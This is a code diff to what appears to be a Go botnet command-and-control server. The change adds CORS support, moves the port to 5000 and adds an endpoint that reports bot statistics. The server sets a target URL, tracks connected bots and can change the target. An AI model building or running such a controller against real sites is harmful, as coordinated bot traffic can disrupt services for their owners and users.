@@ -5,6 +5,7 @@ import (
 	"strconv"
 	"time"
 
+	"github.com/gin-contrib/cors"
 	"github.com/gin-gonic/gin"
 )
 
@@ -40,7 +41,7 @@ type ChangeTargetReqBody struct {
 
 var targetInfo = TargetInfo{"https://theuselessweb.com/", 50}
 var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}}
-var PORT = 3000
+var PORT = 5000
 
 func PostSendBotStats (c *gin.Context) {
 	var botStatsResponse BotStatsReqBody
@@ -131,13 +132,21 @@ func GetConnectedBots (c *gin.Context) {
 	})
 }
 
+func GetBotsStats (c *gin.Context) {
+	c.JSON(200, gin.H{
+		"stats": botnetServer.BotsResponses,
+	})
+}
+
 
 func main() {
 	server := gin.Default()
+	server.Use(cors.Default())
 	
 	server.GET("/getTargetInfo", GetTargetInfo)
 	server.GET("/getServerStatus", GetServerStatus)
 	server.GET("/getConnectedBots", GetConnectedBots)
+	server.GET("/getBotsStats", GetBotsStats)
 	server.POST("/sendBotStat", PostSendBotStats)
 	server.POST("/setServerStatus", SetServerStatus)
 	server.POST("/changeTarget", ChangeTarget)
